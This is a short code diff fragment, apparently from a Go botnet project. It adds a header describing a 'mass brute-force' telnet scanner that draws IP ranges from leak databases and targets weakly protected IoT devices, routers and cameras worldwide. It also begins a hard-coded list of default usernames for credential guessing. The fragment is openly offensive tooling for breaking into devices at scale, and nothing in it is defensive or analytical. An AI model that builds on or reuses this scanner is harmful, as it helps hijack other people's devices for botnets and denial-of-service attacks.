@@ -12,6 +12,15 @@ import (
 	"time"
 )
 
+/* ============================================================================
+ * SERVER-SIDE TELNET SCANNER - Mass Brute-Force Module
+ * ============================================================================
+ * Scans IP ranges from leak databases (IllusionSec DDOS-archive)
+ * Targets: IoT devices, routers, cameras with weak telnet credentials
+ * Features: CIDR expansion, concurrent scanning, result logging
+ * Global coverage: Africa, Asia, Latin America, Middle East, Europe
+ * ============================================================================ */
+
 // Telnet credentials from scanner.c
 var usernames = []string{
 	"root", "admin", "support", "guest", "user", "default", "manager",
